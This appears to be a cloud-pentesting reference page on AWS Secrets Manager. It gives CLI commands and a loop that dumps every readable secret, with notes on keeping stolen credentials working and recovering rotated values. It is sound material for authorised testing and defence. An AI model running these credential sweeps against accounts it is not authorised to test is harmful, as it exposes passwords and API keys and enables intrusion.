---
title: "Secrets Manager: GetSecretValue across stored secrets"
description: "secretsmanager:GetSecretValue to read stored database passwords, API keys, and other secrets, and listing them across the account."
keywords:
  - Secrets Manager
  - GetSecretValue
  - secrets
  - API keys
  - rotation
---

# Secrets Manager

Secrets Manager stores credentials for applications to fetch at runtime, so `secretsmanager:GetSecretValue` is a read straight into the account's passwords, API keys, and connection strings. The permission is frequently granted broadly to application roles, which makes it a prime target once you hold such a role.

## Listing and reading

```bash
aws secretsmanager list-secrets --query 'SecretList[].[Name,ARN]' --output text
aws secretsmanager get-secret-value --secret-id <name-or-arn> \
  --query SecretString --output text
```

## Sweeping everything readable

```bash
for s in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text); do
  echo "== $s =="
  aws secretsmanager get-secret-value --secret-id "$s" --query SecretString --output text 2>/dev/null
done
```

## Exploitation notes

- Reading a secret does not rotate it, so recovered database and third-party credentials keep working.
- Resource policies on a secret can allow cross-account reads; check `get-resource-policy` when a role spans accounts.
- A `VersionStage` of `AWSPREVIOUS` often still returns the prior value, useful when the current one was rotated after exposure.

## Tools

- **AWS CLI** (`secretsmanager get-secret-value`).
- **Pacu** (`secrets__enum`): bulk-dump Secrets Manager and Parameter Store.

## References

- [AWS: GetSecretValue](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html)
- [HackTricks Cloud: Secrets Manager](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-secrets-manager-enum.html)
